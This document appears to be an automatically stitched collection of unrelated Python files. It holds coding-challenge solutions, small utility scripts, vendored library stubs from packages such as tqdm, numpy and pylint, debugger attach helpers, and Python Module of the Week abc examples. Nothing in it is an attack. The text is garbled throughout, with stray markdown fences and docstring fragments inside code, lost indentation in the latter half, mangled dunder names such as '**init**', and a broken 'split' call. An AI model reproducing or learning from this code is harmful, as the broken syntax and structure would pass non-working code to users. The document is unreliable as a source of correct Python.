except KeyboardInterrupt:
    pass

stream.start_stream()
stream.close()
audio.terminate()

sound_file = wave.open("MyRecording.wav", "wb")
sound_file.setchannels(1)
sound_file.setsampwidth(audio.get_sample_size(pyaudio.paInt16))
sound_file.setframerate(44100)
sound_file.writeframes(b"".join(frames))
sound_file.close()

#!/bin/python3
import os
import sys

#
# Complete the waiter function below.
#
def waiter(number, q):
    def isPrime(n):
        for i in range(2, int(n ** 0.5) + 1):
            if n % i == 0:
                return False
        return True

    #
    # Write your code here.
    #
    x = 2
    it = 1
    primes = []
    res = []
    while it <= q:
        if isPrime(x):
            primes.append(x)
            x += 1
            it += 1
            continue
        x += 1

    A = [[] for _ in range(q + 1)]
    B = [[] for _ in range(q + 1)]
    A[0] = number
    for i in range(q):
        for j in range(len(A[i])):
            n = A[i].pop()
            if n % primes[i] == 0:
                B[i].append(n)
            else:
                A[i + 1].append(n)
    for i in range(len(B)):
        while B[i] != []:
            res.append(B[i].pop())
    for i in range(len(A)):
        while A[i] != []:
            res.append(A[i].pop())
    return res


if __name__ == "__main__":
    fptr = open(os.environ["OUTPUT_PATH"], "w")

    nq = input().split()

    n = int(nq[0])

    q = int(nq[1])

    number = list(map(int, input().rstrip().split()))

    result = waiter(number, q)

    fptr.write("\n".join(map(str, result)))
    fptr.write("\n")

    fptr.close()

class Solution(object):
    def robotSim(self, commands, obstacles):
        dx = [0, 1, 0, -1]
        dy = [1, 0, -1, 0]
        x = y = di = 0
        obstacleSet = set(map(tuple, obstacles))
        ans = 0

        for cmd in commands:
            if cmd == -2:  # left
                di = (di - 1) % 4
            elif cmd == -1:  # right
                di = (di + 1) % 4
            else:
                for k in range(cmd):
                    if (x + dx[di], y + dy[di]) not in obstacleSet:
                        x += dx[di]
                        y += dy[di]
                        ans = max(ans, x * x + y * y)

        return ans

# https://leetcode.com/discuss/interview-question/394347/
# Watering Flowers 2.0


class Solution:
    def waterPlants(self, plants, capacity1, capacity2):

        if len(plants) == 0:
            return 0

        pointer1 = 0
        pointer2 = len(plants) - 1

        can1 = capacity1
        can2 = capacity2
        count = 2

        while pointer1 != pointer2:
            if can1 >= plants[pointer1]:
                can1 -= plants[pointer1]
                pointer1 += 1
            else:
                can1 = capacity1
                can1 -= plants[pointer1]
                pointer1 += 1
                count += 1

            if can2 >= plants[pointer2]:
                can2 -= plants[pointer2]
                pointer2 -= 1
            else:
                can2 = capacity2
                can2 -= plants[pointer2]
                pointer2 -= 1
                count += 1

            if pointer1 == pointer2:
                if (can1 + can2) >= plants[pointer1]:
                    return count
                else:
                    return count + 1

            elif pointer2 < pointer1:
                return count


if __name__ == "__main__":
    arr = [2, 4, 1, 2]
    c1 = 5
    c2 = 7
    print(Solution().waterPlants(arr, c1, c2))

# O(n log n) Solution
class Solution1:
    # @param A : list of integers
    # @return a list of integers
    def wave(self, A):
        A.sort()
        for i in range(0, len(A) - 1, 2):
            A[i], A[i + 1] = A[i + 1], A[i]
        return A


# O(n) Solution
class Solution2:
    # @param A : list of integers
    # @return a list of integers
    def wave(self, A):
        n = len(A)
        for i in range(0, n, 2):
            if (i > 0) and A[i] < A[i - 1]:
                A[i], A[i - 1] = A[i - 1], A[i]
            if i < (n - 1) and A[i] < A[i + 1]:
                A[i], A[i + 1] = A[i + 1], A[i]
        return A

#!/bin/python3

import math
import os
import random
import re
import sys

# Complete the weightedUniformStrings function below.
def weightedUniformStrings(s, queries):
    alphabet = {
        "a": 1,
        "b": 2,
        "c": 3,
        "d": 4,
        "e": 5,
        "f": 6,
        "g": 7,
        "h": 8,
        "i": 9,
        "j": 10,
        "k": 11,
        "l": 12,
        "m": 13,
        "n": 14,
        "o": 15,
        "p": 16,
        "q": 17,
        "r": 18,
        "s": 19,
        "t": 20,
        "u": 21,
        "v": 22,
        "w": 23,
        "x": 24,
        "y": 25,
        "z": 26,
    }

    counter = 1
    us = set()
    res = []
    for i in range(len(s)):
        weight = alphabet[s[i]]
        if i + 1 != len(s) and s[i] == s[i + 1]:
            counter += 1
        else:
            counter = 1
        us.add(weight * counter)
    print(us)
    for i in range(len(queries)):
        if queries[i] in us:
            res.append("Yes")
        else:
            res.append("No")
    return res


if __name__ == "__main__":
    fptr = open(os.environ["OUTPUT_PATH"], "w")

    s = input()

    queries_count = int(input())

    queries = []

    for _ in range(queries_count):
        queries_item = int(input())
        queries.append(queries_item)

    result = weightedUniformStrings(s, queries)

    fptr.write("\n".join(result))
    fptr.write("\n")

    fptr.close()

def magicalWell(a, b, n):
    s, m = 0, 0
    while m < n:
        s += a * b
        a += 1
        b += 1
        m += 1
    return s

# Alarm in Python
# Playing Sound on youtube to wake the person up
# I havent really battle tested the program so it might contain bugs
# If you come accross the bugs inform me

from time import sleep, ctime
import datetime
import webbrowser
import random

now = datetime.datetime.now()
linksToSounds = [
    "https://www.youtube.com/watch?v=6pR5cyH63mA",
    "https://www.youtube.com/watch?v=e12KryuLcbs",
    "https://www.youtube.com/watch?v=nbjwmC8K4K4",
    "https://www.youtube.com/watch?v=UqSww10eeKw",
    "https://www.youtube.com/watch?v=9f06QZCVUHg",
    "https://www.youtube.com/watch?v=kffacxfA7G4",
]  # remember to add links and test the code


def alarm(h, m, s):
    timeToSleep = h * 3600 + m * 60 + s
    sleepingTime = sleep(timeToSleep)
    playSound = webbrowser.open_new(random.choice(linksToSounds))


# Main code
print(ctime(), "\n")
startOrEnd = str(input("Set alarm or End : "))
if startOrEnd.strip() == "Set alarm":
    hours = int(input("Hours : "))
    minutes = int(input("Minutes : "))
    seconds = int(input("Seconds : "))
    print("Alarm started at %s : %s" % (now.hour, now.minute))
    print(alarm(hours, minutes, seconds))
    wakedUp = False
    while wakedUp == False:
        get = str(input("Have you waked up : "))
        if get == "Yes":
            print("Good")
            wakedUp = True
        else:
            sleepMoreTime = sleep(300)  # playing sound again in 5 minutes
            playSoundAgain = webbrowser.open_new(random.choice(linksToSounds))
            continue

else:
    quit()

def print_full_name(a, b):
    print("Hello " + a + " " + b + "! You just delved into python.")


if __name__ == "__main__":
    first_name = input()
    last_name = input()
    print_full_name(first_name, last_name)

import subprocess

connected = subprocess.check_output(["netsh", "wlan", "show", "network"])
connected = connected.decode("ascii")
connected = connected.replace("\r", "")
ls = connected.split("\n")
ls = ls[4:]
ssids = []
x = 0
while x < len(ls):
    if x % 5 == 0:
        ssids.append(ls[x])
    x += 1
print(ssids)
print("\n")
# Contributed by: Anubhab

def electionsWinners(votes, k):
    max_vote = max(votes)
    len_vote = len(votes)
    if k == 0 and votes.count(max_vote) == 1:
        return 1
    return len([i for i in range(len_vote) if votes[i] + k > max_vote])

#!/bin/python3

import math
import os
import random
import re
import sys
from collections import Counter

# Complete the winningLotteryTicket function below.
def winningLotteryTicket(tickets):
    l = [0] * len(tickets)
    mx = (2 ** 10) - 1
    for i in range(len(tickets)):
        x = set(tickets[i])
        if "0" in x:
            l[i] = l[i] * 10 + 1
        else:
            l[i] = l[i] * 10
        if "1" in x:
            l[i] = l[i] * 10 + 1
        else:
            l[i] = l[i] * 10
        if "2" in x:
            l[i] = l[i] * 10 + 1
        else:
            l[i] = l[i] * 10
        if "3" in x:
            l[i] = l[i] * 10 + 1
        else:
            l[i] = l[i] * 10
        if "4" in x:
            l[i] = l[i] * 10 + 1
        else:
            l[i] = l[i] * 10
        if "5" in x:
            l[i] = l[i] * 10 + 1
        else:
            l[i] = l[i] * 10
        if "6" in x:
            l[i] = l[i] * 10 + 1
        else:
            l[i] = l[i] * 10
        if "7" in x:
            l[i] = l[i] * 10 + 1
        else:
            l[i] = l[i] * 10
        if "8" in x:
            l[i] = l[i] * 10 + 1
        else:
            l[i] = l[i] * 10
        if "9" in x:
            l[i] = l[i] * 10 + 1
        else:
            l[i] = l[i] * 10
    p = 0
    for i in range(len(l)):
        l[i] = int(str(l[i]), 2)
    count = Counter(l)
    for i in range(0, mx + 1):
        for j in range(i, mx + 1):
            if i | j == 1023:
                if i == j:
                    p += (count[i] * (count[i] - 1)) // 2
                else:
                    p = p + (count[i] * count[j])
    return p


if name == "main":
    fptr = open(os.environ["OUTPUT_PATH"], "w")

    n = int(input())

    tickets = []

    for _ in range(n):
        tickets_item = input()
        tickets.append(tickets_item)

    result = winningLotteryTicket(tickets)

    fptr.write(str(result) + "\n")

    fptr.close()

def longestWord(text):
    word_split = re.findall(r"[\w']+", text)
    longest_word = ""
    for word in word_split:
        if len(word) > len(longest_word) and word.isalpha():
            longest_word = word
    return longest_word

def is_leap(year):
    if (year % 4 != 0) or (year % 100 == 0 and year % 400 != 0):
        leap = False
    else:
        leap = True
    return leap

import pafy

url = "https://www.youtube.com/watch?v=OE7wUUpJw6I&list=PL2_aWCzGMAwLPEZrZIcNEq9ukGWPfLT4A"
video = pafy.new(url)
print(video.title)

stream = pafy.new(url).streams

best = video.getbest()
for i in stream:
    print(i)

print(best.resolution, best.extension)
print(best.url)
best.download(quiet=False)

class Solution1:
    def zigZag(self, arr, n):
        # code here
        arr.sort()
        for i in range(1, n - 1, 2):
            arr[i], arr[i + 1] = arr[i + 1], arr[i]
        return arr


class Solution2:
    def zigZag(self, arr, n):
        # code here
        flag = True
        for i in range(n - 1):
            if flag:
                if arr[i] > arr[i + 1]:
                    arr[i], arr[i + 1] = arr[i + 1], arr[i]
            else:
                if arr[i] < arr[i + 1]:
                    arr[i], arr[i + 1] = arr[i + 1], arr[i]
            flag = bool(1 - flag)
        return arr

# Enter your code here. Read input from STDIN. Print output to STDOUT
n, s = map(int, input().split())
data = [list(map(float, input().split())) for _ in range(s)]
for i in zip(*data):
    print("%.2f" % (sum(i) / s))

# This file is dual licensed under the terms of the Apache License, Version
# 2.0, and the BSD License. See the LICENSE file in the root of this repository
# for complete details.

__all__ = [
    "__title__",
    "__summary__",
    "__uri__",
    "__version__",
    "__author__",
    "__email__",
    "__license__",
    "__copyright__",
]

__title__ = "packaging"
__summary__ = "Core utilities for Python packages"
__uri__ = "https://github.com/pypa/packaging"

__version__ = "21.0"

__author__ = "Donald Stufft and individual contributors"
__email__ = "donald@stufft.io"

__license__ = "BSD-2-Clause or Apache-2.0"
__copyright__ = "2014-2019 %s" % __author__

import argparse

from pip._vendor.certifi import contents, where

parser = argparse.ArgumentParser()
parser.add_argument("-c", "--contents", action="store_true")
args = parser.parse_args()

if args.contents:
    print(contents())
else:
    print(where())

# Licensed under the GPL: https://www.gnu.org/licenses/old-licenses/gpl-2.0.html
# For details: https://github.com/PyCQA/pylint/blob/main/LICENSE
from typing import Tuple

__version__ = "2.9.6"


def get_numversion_from_version(v: str) -> Tuple:
    """Kept for compatibility reason

    See https://github.com/PyCQA/pylint/issues/4399
    https://github.com/PyCQA/pylint/issues/4420,
    """
    v = v.replace("pylint-", "")
    version = []
    for n in v.split(".")[0:3]:
        try:
            version.append(int(n))
        except ValueError:
            num = ""
            for c in n:
                if c.isdigit():
                    num += c
                else:
                    break
            try:
                version.append(int(num))
            except ValueError:
                version.append(0)
    while len(version) != 3:
        version.append(0)
    return tuple(version)


numversion = get_numversion_from_version(__version__)

# .-. .-. .-. . . .-. .-. .-. .-.
# |(  |-  |.| | | |-  `-.  |  `-.
# ' ' `-' `-`.`-' `-' `-'  '  `-'

__title__ = "requests"
__description__ = "Python HTTP for Humans."
__url__ = "https://requests.readthedocs.io"
__version__ = "2.26.0"
__build__ = 0x022600
__author__ = "Kenneth Reitz"
__author_email__ = "me@kennethreitz.org"
__license__ = "Apache 2.0"
__copyright__ = "Copyright 2020 Kenneth Reitz"
__cake__ = u"\u2728 \U0001f370 \u2728"

import threading
import os
import sys
import struct

print("Executable: %s" % sys.executable)


def loop_in_thread():
    while True:
        import time

        time.sleep(0.5)
        sys.stdout.write("#")
        sys.stdout.flush()


threading.Thread(target=loop_in_thread).start()


def is_python_64bit():
    return struct.calcsize("P") == 8


print("Is 64: %s" % is_python_64bit())

if __name__ == "__main__":
    print("pid:%s" % (os.getpid()))
    i = 0
    while True:
        i += 1
        import time

        time.sleep(0.5)
        sys.stdout.write(".")
        sys.stdout.flush()
        if i % 40 == 0:
            sys.stdout.write("\n")
            sys.stdout.flush()
````

````py
This module provides means to detect the App Engine environment.```


```py

import os


def is_appengine():
    return is_local_appengine() or is_prod_appengine()


def is_appengine_sandbox():
    """Reports if the app is running in the first generation sandbox.

    The second generation runtimes are technically still in a sandbox, but it
    is much less restrictive, so generally you shouldn't need to check for it.
    see https://cloud.google.com/appengine/docs/standard/runtimes
    """
    return is_appengine() and os.environ["APPENGINE_RUNTIME"] == "python27"


def is_local_appengine():
    return "APPENGINE_RUNTIME" in os.environ and os.environ.get(
        "SERVER_SOFTWARE", ""
    ).startswith("Development/")


def is_prod_appengine():
    return "APPENGINE_RUNTIME" in os.environ and os.environ.get(
        "SERVER_SOFTWARE", ""
    ).startswith("Google App Engine/")


def is_prod_appengine_mvms():
    """Deprecated."""
    return False
````

````pytest utilities that use async/await syntax

a separate file to avoid syntax errors on Python 2```


```py

import asyncio


def async_func():
    """Simple async function to schedule a task on the current eventloop"""
    loop = asyncio.get_event_loop()
    assert loop.is_running()

    async def task():
        await asyncio.sleep(1)

    loop.create_task(task())

import add_code_to_python_process
print add_code_to_python_process.run_python_code(3736, "print(20)", connect_debugger_tracing=False)
````

````py
Common code used in multiple modules.```


```py


class weekday(object):
    __slots__ = ["weekday", "n"]

    def __init__(self, weekday, n=None):
        self.weekday = weekday
        self.n = n

    def __call__(self, n):
        if n == self.n:
            return self
        else:
            return self.__class__(self.weekday, n)

    def __eq__(self, other):
        try:
            if self.weekday != other.weekday or self.n != other.n:
                return False
        except AttributeError:
            return False
        return True

    def __hash__(self):
        return hash((self.weekday, self.n))

    def __ne__(self, other):
        return not (self == other)

    def __repr__(self):
        s = ("MO", "TU", "WE", "TH", "FR", "SA", "SU")[self.weekday]
        if not self.n:
            return s
        else:
            return "%s(%+d)" % (s, self.n)


# vim:ts=4:sw=4:et

from __future__ import absolute_import, division, print_function


__all__ = ["set_run_validators", "get_run_validators"]

_run_validators = True


def set_run_validators(run):
    """
    Set whether or not validators are run.  By default, they are run.
    """
    if not isinstance(run, bool):
        raise TypeError("'run' must be bool.")
    global _run_validators
    _run_validators = run


def get_run_validators():
    """
    Return whether or not validators are run.
    """
    return _run_validators

SHELL_NAMES = {
    "sh",
    "bash",
    "dash",  # Bourne.
    "csh",
    "tcsh",  # C.
    "ksh",
    "zsh",
    "fish",  # Common alternatives.
    "cmd",
    "powershell",
    "pwsh",  # Microsoft.
    "elvish",
    "xonsh",  # More exotic.
}

# %%
class SetuptoolsDeprecationWarning(Warning):
    """
    Base class for warning deprecations in ``setuptools``

    This class is not derived from ``DeprecationWarning``, and as such is
    visible by default.
    """
````

````py Distributor init file

Distributors: you can add custom code here to support particular distributions
of numpy.

For example, this is a good place to put any checks for hardware requirements.

The numpy standard source distribution will not put code in this file, so you
can safely replace this file with your own version.```


```py

from __future__ import absolute_import, unicode_literals

from twisted.internet import reactor
from twisted.web.wsgi import WSGIResource

from .. import exposition, REGISTRY

MetricsResource = lambda registry=REGISTRY: WSGIResource(
    reactor, reactor.getThreadPool(), exposition.make_wsgi_app(registry)
)

from warnings import warn

from .cli import *  # NOQA
from .cli import __all__  # NOQA
from .std import TqdmDeprecationWarning

warn(
    "This function will be removed in tqdm==5.0.0\n"
    "Please use `tqdm.cli.*` instead of `tqdm._main.*`",
    TqdmDeprecationWarning,
    stacklevel=2,
)
````

```pyA module with the precisions of platform-specific `~numpy.number`s."""

from typing import Any

# To-be replaced with a `npt.NBitBase` subclass by numpy's mypy plugin

\_NBitByte = Any
\_NBitShort = Any
\_NBitIntC = Any
\_NBitIntP = Any
\_NBitInt = Any
\_NBitLongLong = Any

\_NBitHalf = Any
\_NBitSingle = Any
\_NBitDouble = Any
\_NBitLongDouble = Any

from **future** import absolute_import, unicode_literals

import os
from stat import S_IXGRP, S_IXOTH, S_IXUSR

from virtualenv.util.six import ensure_text

def make_exe(filename):
original_mode = filename.stat().st_mode
levels = [S_IXUSR, S_IXGRP, S_IXOTH]
for at in range(len(levels), 0, -1):
try:
mode = original_mode
for level in levels[:at]:
mode |= level
filename.chmod(mode)
break
except OSError:
continue

def set*tree(folder, stat):
for root,*, files in os.walk(ensure_text(str(folder))):
for filename in files:
os.chmod(os.path.join(root, filename), stat)

**all** = ("make_exe", "set_tree")

import os
import re

from .\_default import Process

STAT_PPID = 3
STAT_TTY = 6

def get_process_mapping():
"""Try to look up the process tree via the /proc interface.
"""
with open("/proc/{0}/stat".format(os.getpid())) as f:
self_tty = f.read().split()[STAT_TTY]
processes = {}
for pid in os.listdir("/proc"):
if not pid.isdigit():
continue
try:
stat = "/proc/{0}/stat".format(pid)
cmdline = "/proc/{0}/cmdline".format(pid)
with open(stat) as fstat, open(cmdline) as fcmdline:
stat = re.findall(r"\(.+\)|\S+", fstat.read())
cmd = fcmdline.read().split["\x00"](:-1)
ppid = stat[STAT_PPID]
tty = stat[STAT_TTY]
if tty == self_tty:
processes[pid] = Process(args=tuple(cmd), pid=pid, ppid=ppid)
except IOError: # Process has disappeared - just ignore it.
continue
return processes

import collections
import shlex
import subprocess
import sys

Process = collections.namedtuple("Process", "args pid ppid")

def get_process_mapping():
"""Try to look up the process tree via the output of `ps`.
"""
output = subprocess.check_output(
["ps", "-ww", "-o", "pid=", "-o", "ppid=", "-o", "args="]
)
if not isinstance(output, str):
output = output.decode(sys.stdout.encoding)
processes = {}
for line in output.split("\n"):
try:
pid, ppid, args = line.strip().split(None, 2)
except ValueError:
continue
processes[pid] = Process(args=tuple(shlex.split(args)), pid=pid, ppid=ppid)
return processes

# We must redefine it in Py3k if it's not already there

def execfile(file, glob=None, loc=None):
if glob is None:
import sys

        glob = sys._getframe().f_back.f_globals
    if loc is None:
        loc = glob

    # It seems that the best way is using tokenize.open(): http://code.activestate.com/lists/python-dev/131251/
    # (but tokenize.open() is only available for python 3.2)
    import tokenize

    if hasattr(tokenize, "open"):
        # version 3.2
        stream = tokenize.open(file)  # @UndefinedVariable
    else:
        # version 3.0 or 3.1
        detect_encoding = tokenize.detect_encoding(open(file, mode="rb").readline)
        stream = open(file, encoding=detect_encoding[0])
    try:
        contents = stream.read()
    finally:
        stream.close()

    # execute the script (note: it's important to compile first to have the filename set in debug mode)
    exec(compile(contents + "\n", file, "exec"), glob, loc)

import traceback
import sys

try:
import StringIO
except:
import io as StringIO # Python 3.0

class Log:
def **init**(self):
self.\_contents = []

    def add_content(self, *content):
        self._contents.append(" ".join(content))

    def add_exception(self):
        s = StringIO.StringIO()
        exc_info = sys.exc_info()
        traceback.print_exception(
            exc_info[0], exc_info[1], exc_info[2], limit=None, file=s
        )
        self._contents.append(s.getvalue())

    def get_contents(self):
        return "\n".join(self._contents)

    def clear_log(self):
        del self._contents[:]

from typing import Union, Tuple, Any

import numpy as np

# NOTE: `_StrLike_co` and `_BytesLike_co` are pointless, as `np.str_` and

# `np.bytes_` are already subclasses of their builtin counterpart

\_CharLike_co = Union[str, bytes]

# The 6 `<X>Like_co` type-aliases below represent all scalars that can be

# coerced into `<X>` (with the casting rule `same_kind`)

_BoolLike_co = Union[bool, np.bool_]
\_UIntLike_co = Union[_BoolLike_co, np.unsignedinteger]
\_IntLike_co = Union[_BoolLike_co, int, np.integer]
\_FloatLike_co = Union[_IntLike_co, float, np.floating]
\_ComplexLike_co = Union[_FloatLike_co, complex, np.complexfloating]
\_TD64Like_co = Union[_IntLike_co, np.timedelta64]

_NumberLike_co = Union[int, float, complex, np.number, np.bool_]
\_ScalarLike_co = Union[int, float, complex, str, bytes, np.generic]

# `_VoidLike_co` is technically not a scalar, but it's close enough

\_VoidLike_co = Union[Tuple[Any, ...], np.void]

import sys
from typing import Sequence, Tuple, Union, Any

if sys.version_info >= (3, 8):
from typing import SupportsIndex
else:
try:
from typing_extensions import SupportsIndex
except ImportError:
SupportsIndex = Any

\_Shape = Tuple[int, ...]

# Anything that can be coerced to a shape tuple

\_ShapeLike = Union[SupportsIndex, Sequence[SupportsIndex]]

import sys
import warnings

class PyStdIsDeprecatedWarning(DeprecationWarning):
pass

class Std(object):
""" makes top-level python modules available as an attribute,
importing them on first access.
"""

    def __init__(self):
        self.__dict__ = sys.modules

    def __getattr__(self, name):
        warnings.warn(
            "py.std is deprecated, please import %s directly" % name,
            category=PyStdIsDeprecatedWarning,
            stacklevel=2,
        )
        try:
            m = __import__(name)
        except ImportError:
            raise AttributeError("py.std: could not import %s" % name)
        return m

std = Std()

import subprocess
import sys

print(sys.executable)

if **name** == "**main**":
p = subprocess.Popen([sys.executable, "-u", "_always_live_program.py"])
import attach_pydevd

    attach_pydevd.main(
        attach_pydevd.process_command_line(["--pid", str(p.pid), "--protocol", "http"])
    )
    p.wait()

from warnings import warn

from .std import \* # NOQA
from .std import **all** # NOQA
from .std import TqdmDeprecationWarning

warn(
"This function will be removed in tqdm==5.0.0\n"
"Please use `tqdm.std.*` instead of `tqdm._tqdm.*`",
TqdmDeprecationWarning,
stacklevel=2,
)

from warnings import warn

from .gui import \* # NOQA
from .gui import **all** # NOQA
from .std import TqdmDeprecationWarning

warn(
"This function will be removed in tqdm==5.0.0\n"
"Please use `tqdm.gui.*` instead of `tqdm._tqdm_gui.*`",
TqdmDeprecationWarning,
stacklevel=2,
)

from warnings import warn

from .notebook import \* # NOQA
from .notebook import **all** # NOQA
from .std import TqdmDeprecationWarning

warn(
"This function will be removed in tqdm==5.0.0\n"
"Please use `tqdm.notebook.*` instead of `tqdm._tqdm_notebook.*`",
TqdmDeprecationWarning,
stacklevel=2,
)

import sys

**author** = "github.com/casperdcl"
**all** = ["tqdm_pandas"]

def tqdm_pandas(tclass, \*\*tqdm_kwargs):
"""
Registers the given `tqdm` instance with
`pandas.core.groupby.DataFrameGroupBy.progress_apply`.
"""
from tqdm import TqdmDeprecationWarning

    if isinstance(tclass, type) or (
        getattr(tclass, "__name__", "").startswith("tqdm_")
    ):  # delayed adapter case
        TqdmDeprecationWarning(
            "Please use `tqdm.pandas(...)` instead of `tqdm_pandas(tqdm, ...)`.",
            fp_write=getattr(tqdm_kwargs.get("file", None), "write", sys.stderr.write),
        )
        tclass.pandas(**tqdm_kwargs)
    else:
        TqdmDeprecationWarning(
            "Please use `tqdm.pandas(...)` instead of `tqdm_pandas(tqdm(...))`.",
            fp_write=getattr(tclass.fp, "write", sys.stderr.write),
        )
        type(tclass).pandas(deprecated_t=tclass)

````


```py
Timezone utilities

Just UTC-awareness right now```


```py

# Copyright (c) Jupyter Development Team.
# Distributed under the terms of the Modified BSD License.

from datetime import tzinfo, timedelta, datetime

# constant for zero offset
ZERO = timedelta(0)


class tzUTC(tzinfo):
    """tzinfo object for UTC (zero offset)"""

    def utcoffset(self, d):
        return ZERO

    def dst(self, d):
        return ZERO


UTC = tzUTC()


def utc_aware(unaware):
    """decorator for adding UTC tzinfo to datetime's utcfoo methods"""

    def utc_method(*args, **kwargs):
        dt = unaware(*args, **kwargs)
        return dt.replace(tzinfo=UTC)

    return utc_method


utcfromtimestamp = utc_aware(datetime.utcfromtimestamp)
utcnow = utc_aware(datetime.utcnow)


def isoformat(dt):
    """Return iso-formatted timestamp

    Like .isoformat(), but uses Z for UTC instead of +00:00
    """
    return dt.isoformat().replace("+00:00", "Z")

def get_short_path_name(long_name):
    """
    Gets the short path name of a given long path.
    http://stackoverflow.com/a/23598461/200291
    """
    import ctypes
    from ctypes import wintypes

    _GetShortPathNameW = ctypes.windll.kernel32.GetShortPathNameW
    _GetShortPathNameW.argtypes = [wintypes.LPCWSTR, wintypes.LPWSTR, wintypes.DWORD]
    _GetShortPathNameW.restype = wintypes.DWORD
    output_buf_size = 0
    while True:
        output_buf = ctypes.create_unicode_buffer(output_buf_size)
        needed = _GetShortPathNameW(long_name, output_buf, output_buf_size)
        if output_buf_size >= needed:
            return output_buf.value
        else:
            output_buf_size = needed

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


# end_pymotw_header
print("running {}".format(__file__))
````

````py
Convert a string of characters to a sequence of numbers
corresponding to the character's position in the alphabet.

https://www.dcode.fr/letter-number-cipher
http://bestcodes.weebly.com/a1z26.html```


```py


def encode(plain: str) -> list[int]:
    """
    >>> encode("myname")
    [13, 25, 14, 1, 13, 5]
    """
    return [ord(elem) - 96 for elem in plain]


def decode(encoded: list[int]) -> str:
    """
    >>> decode([13, 25, 14, 1, 13, 5])
    'myname'
    """
    return "".join(chr(elem + 96) for elem in encoded)


def main() -> None:
    encoded = encode(input("-> ").strip().lower())
    print("Encoded: ", encoded)
    print("Decoded:", decode(encoded))


if __name__ == "__main__":
    main()

from utils import (
    create_newfig,
    create_moving_point,
    create_still_segment,
    run_or_export,
)


def setup_fig01():
    fig, ax, renderer = create_newfig("aa01")

    create_moving_point(fig, ax, renderer, 1, 1, 6, 1)
    create_still_segment(fig, ax, renderer, (2, 4), (6, 2))
    return fig, ax, "aa01_test_point_line_no_intr"


def setup_fig02():
    fig, ax, renderer = create_newfig("aa02")

    create_moving_point(fig, ax, renderer, 1, 1, 1, 4)
    create_still_segment(fig, ax, renderer, (2, 4), (6, 2), "topright")
    return fig, ax, "aa02_test_point_line_no_intr"


def setup_fig03():
    fig, ax, renderer = create_newfig("aa03")

    create_moving_point(fig, ax, renderer, 4, 1, 1, 4)
    create_still_segment(fig, ax, renderer, (2, 4), (6, 4), "topright")
    return fig, ax, "aa03_test_point_line_no_intr"


def setup_fig04():
    fig, ax, renderer = create_newfig("aa04")

    create_moving_point(fig, ax, renderer, 2, 1, 6, 4)
    create_still_segment(fig, ax, renderer, (1, 2), (5, 4), "topleft")
    return fig, ax, "aa04_test_point_line_no_intr"


run_or_export(setup_fig01, setup_fig02, setup_fig03, setup_fig04)
````

````py
    pygments.styles.abap
    ~~~~~~~~~~~~~~~~~~~~

    ABAP workbench like style.

    :copyright: Copyright 2006-2021 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.```


```py

from pygments.style import Style
from pygments.token import Keyword, Name, Comment, String, Error, Number, Operator


class AbapStyle(Style):
    default_style = ""
    styles = {
        Comment: "italic #888",
        Comment.Special: "#888",
        Keyword: "#00f",
        Operator.Word: "#00f",
        Name: "#000",
        Number: "#3af",
        String: "#5a2",
        Error: "#F00",
    }
````

````py
https://www.hackerrank.com/challenges/abbr/problem
You can perform the following operation on some string, :

1. Capitalize zero or more of 's lowercase letters at some index i
   (i.e., make them uppercase).
2. Delete all of the remaining lowercase letters in .

Example:
a=daBcd and b="ABC"
daBcd -> capitalize a and c(dABCd) -> remove d (ABC)```


```py


def abbr(a, b):
    n = len(a)
    m = len(b)
    dp = [[False for _ in range(m + 1)] for _ in range(n + 1)]
    dp[0][0] = True
    for i in range(n):
        for j in range(m + 1):
            if dp[i][j]:
                if j < m and a[i].upper() == b[j]:
                    dp[i + 1][j + 1] = True
                if a[i].islower():
                    dp[i + 1][j] = True
    return dp[n][m]


if __name__ == "__main__":
    print(abbr("daBcd", "ABC"))  # expect True

# Python3 program to add two numbers

number1 = input("First number: ")
number2 = input("\nSecond number: ")

# Adding two numbers
# User might also enter float numbers
sum = float(number1) + float(number2)

# Display the sum
# will print value in float
print("The sum of {0} and {1} is {2}".format(number1, number2, sum))

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


# end_pymotw_header
import abc


class PluginBase(abc.ABC):
    @abc.abstractmethod
    def load(self, input):
        """Retrieve data from the input source
        and return an object.
        """

    @abc.abstractmethod
    def save(self, output, data):
        """Save the data object to the output."""


class SubclassImplementation(PluginBase):
    def load(self, input):
        return input.read()

    def save(self, output, data):
        return output.write(data)


if __name__ == "__main__":
    print("Subclass:", issubclass(SubclassImplementation, PluginBase))
    print("Instance:", isinstance(SubclassImplementation(), PluginBase))

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


# end_pymotw_header
import abc


class Base(abc.ABC):
    @property
    @abc.abstractmethod
    def value(self):
        return "Should never reach here"

    @property
    @abc.abstractmethod
    def constant(self):
        return "Should never reach here"


class Implementation(Base):
    @property
    def value(self):
        return "concrete property"

    constant = "set by a class attribute"


try:
    b = Base()
    print("Base.value:", b.value)
except Exception as err:
    print("ERROR:", str(err))

i = Implementation()
print("Implementation.value   :", i.value)
print("Implementation.constant:", i.constant)

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


# end_pymotw_header
import abc


class Base(abc.ABC):
    @property
    @abc.abstractmethod
    def value(self):
        return "Should never reach here"

    @value.setter
    @abc.abstractmethod
    def value(self, new_value):
        return


class PartialImplementation(Base):
    @property
    def value(self):
        return "Read-only"


class Implementation(Base):

    _value = "Default value"

    @property
    def value(self):
        return self._value

    @value.setter
    def value(self, new_value):
        self._value = new_value


try:
    b = Base()
    print("Base.value:", b.value)
except Exception as err:
    print("ERROR:", str(err))

p = PartialImplementation()
print("PartialImplementation.value:", p.value)

try:
    p.value = "Alteration"
    print("PartialImplementation.value:", p.value)
except Exception as err:
    print("ERROR:", str(err))

i = Implementation()
print("Implementation.value:", i.value)

i.value = "New value"
print("Changed value:", i.value)

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


# end_pymotw_header
import abc


class PluginBase(metaclass=abc.ABCMeta):
    @abc.abstractmethod
    def load(self, input):
        """Retrieve data from the input source
        and return an object.
        """

    @abc.abstractmethod
    def save(self, output, data):
        """Save the data object to the output."""

# Copyright (c) 2009 Doug Hellmann All rights reserved.
#```









---


```py


# end_pymotw_header
import abc


class Base(abc.ABC):
    @classmethod
    @abc.abstractmethod
    def factory(cls, *args):
        return cls()

    @staticmethod
    @abc.abstractmethod
    def const_behavior():
        return "Should never reach here"


class Implementation(Base):
    def do_something(self):
        pass

    @classmethod
    def factory(cls, *args):
        obj = cls(*args)
        obj.do_something()
        return obj

    @staticmethod
